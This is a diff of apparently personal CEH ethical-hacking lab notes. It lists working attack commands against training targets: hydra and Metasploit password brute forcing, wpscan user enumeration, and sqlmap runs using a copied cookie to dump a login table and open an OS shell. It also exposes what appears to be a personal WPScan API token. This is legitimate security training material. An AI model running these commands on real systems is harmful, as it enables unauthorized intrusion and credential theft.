@@ -65,7 +65,7 @@
 
 **Addition**
 
-- nbtstat -a [IP]
+- nbtstat -a [IP] (Windows)
 - nbtstat -c
 
 **Module 06: System Hacking**
@@ -200,7 +200,7 @@
 **Lab2-Task1: Crack FTP Credentials using a Dictionary Attack**
 
 - nmap -p 21 [IP]
-- **hydra -L /home/attacker/Desktop/Wordlists/usernames.txt -P /home/attacker/Desktop/Wordlists/passwords.txt ftp://10.10.10.10**
+- **hydra -L usernames.txt -P passwords.txt ftp://10.10.10.10**
 
 **Module 14: Hacking Web Applications**
 
@@ -227,7 +227,7 @@
 
 **Lab2-Task5: Enumerate and Hack a Web Application using WPScan and Metasploit**
 
-- **wpscan –api-token [API Token] –url**  **http://10.10.10.16:8080/CEH**  **--plugins-detection aggressive --enumerate** u
+- **wpscan -–api-token hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads –-url**  **http://10.10.10.16:8080/CEH**  **--plugins-detection aggressive --enumerate u**
   - **--enumerate u: Specify the enumeration of users**
   - **API Token: Register at** [**https://wpscan.com/register**](https://wpscan.com/register)
   - **Mine: hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads**
@@ -235,7 +235,7 @@
 - msfconsole
 - **use auxiliary/scanner/http/wordpress\_login\_enum**
 - show options
-- **set PASS\_FILE /home/attacker/Desktop/CEHv11 Module 14 Hacking Web Applications/Wordlist/password.txt**
+- **set PASS\_FILE password.txt**
 - **set RHOST 10.10.10.16**
 - **set RPORT 8080**
 - **set TARGETURI**  **http://10.10.10.16:8080/CEH**
@@ -265,20 +265,20 @@
 - Login a website
 - Inspect element
 - Dev tools-\&gt;Console: document.cookie
-- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;[cookie value that you copied in Step 8]&quot; –dbs**
+- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; –dbs**
   - **-u: Specify the target URL**
   - **--cookie: Specify the HTTP cookie header value**
   - **--dbs: Enumerate DBMS databases**
 - Get a list of databases
 - Select a database to extract its tables
-- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;[cookie value which you have copied in Step 8]&quot; -D moviescope –tables**
+- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; -D moviescope –tables**
   - **-D: Specify the DBMS database to enumerate**
   - **--tables: Enumerate DBMS database tables**
 - Get a list of tables
 - Select a column
-- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;[cookie value which you have copied in Step 8]&quot; -D moviescope –T User\_Login --dump**
+- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; -D moviescope –T User\_Login --dump**
 - Get table data of this column
-- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;[cookie value which you have copied in Step 8]&quot; --os-shell**
+- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; --os-shell**
 - Get the OS Shell
 - TASKLIST
 
@@ -313,6 +313,7 @@
   - Module 15: Lab1-Task2
 - **WPScan**
   - Module 14: Lab2-Task5
+  - wpscan –url [URL]
 - **Nikto**
   - [https://zhuanlan.zhihu.com/p/124246499](https://zhuanlan.zhihu.com/p/124246499%20)
 - **John**
@@ -360,6 +361,7 @@
   - Module 06: Lab0-Task0
 - **Windows SMB**
   - smbclient -L [IP]
+  - smbclient \\ip\\sharename
   - nmap -p 445 -sV –script smb-enum-services [IP]
 - **Run Nmap at the beginning (Not verified)**
   - Nmap -sV -sC -oA nmap 10.10.10.x
